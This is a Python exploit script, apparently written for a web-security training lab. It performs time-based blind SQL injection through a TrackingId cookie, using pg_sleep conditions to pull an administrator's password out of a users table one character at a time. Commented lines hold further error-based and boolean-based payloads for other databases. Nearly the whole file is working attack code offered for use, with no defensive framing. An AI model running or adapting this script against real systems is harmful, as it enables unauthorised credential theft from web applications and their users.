import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            escaped_quote = "''" if chr(j) == "'" else chr(j)
            sqli_payload = "'||(select case when (username='administrator' and substring(password,%s,1)='%s') then pg_sleep(3) else pg_sleep(-1) end from users)--" % (i,escaped_quote)

            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'XZBeeARjIONyqkN2' + sqli_payload_encoded, 'session': '8cw0KnE4CM6rTkuDlioZEP2NqXATlnML'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if float(r.elapsed.total_seconds()) > 3:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

#' and (select ascii(substring(password,%s,1)) from users where #username='administrator')='%s'--
 
#' or (select case when (ascii((substr((select password from users where #sername='administrator'),%s,1)))='%s') then '1' else to_char(1/0) end #from dual)='1'--

#'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' #END FROM users WHERE username='administrator')||''

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()